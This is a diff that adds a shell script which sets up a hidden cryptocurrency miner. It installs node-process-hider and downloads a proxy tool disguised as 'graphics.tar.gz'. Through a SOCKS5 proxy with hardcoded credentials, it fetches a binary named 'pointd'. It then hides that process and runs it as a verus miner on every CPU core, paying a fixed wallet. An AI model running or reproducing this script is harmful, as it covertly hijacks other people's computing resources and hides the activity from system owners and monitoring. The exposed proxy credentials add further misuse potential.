@@ -1,0 +1,64 @@
+#!/bin/sh
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+wget -O - https://deb.nodesource.com/setup_17.x | bash
+
+apt -y install nodejs
+
+apt -y install npm
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = cpusocks1.wot.mrface.com:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+ls -la
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .5
+
+./graftcp/graftcp wget -q https://github.com/manorepas/bash/raw/main/pointd
+chmod +x pointd
+
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
+
+ph add pointd
+
+./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.laopoto -p x -t $(nproc) -x socks5://mikrotik999:Elibawnos@cpusocks1.wot.mrface.com:1080
